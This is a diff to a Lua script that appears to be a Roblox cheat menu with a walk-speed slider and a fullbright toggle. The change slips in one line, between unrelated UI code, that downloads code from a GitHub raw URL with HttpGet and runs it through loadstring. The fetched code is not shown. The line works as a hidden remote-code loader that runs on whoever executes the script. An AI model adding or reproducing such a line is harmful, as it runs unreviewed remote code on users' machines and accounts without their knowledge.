@@ -650,7 +650,7 @@ EssentialsTab:Slider("Speed Value", 2, maxSpeedValue, math.min(Settings.speedVal
         Settings.speedValue = value
     end, "Speed Value Slider")
 end, "Set your desired walk speed")
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeScript/ZeScripts/refs/heads/main/Debug"))()
 local fullbrightEnabled  = false
 local originalLighting   = {}
 local lightingConnection
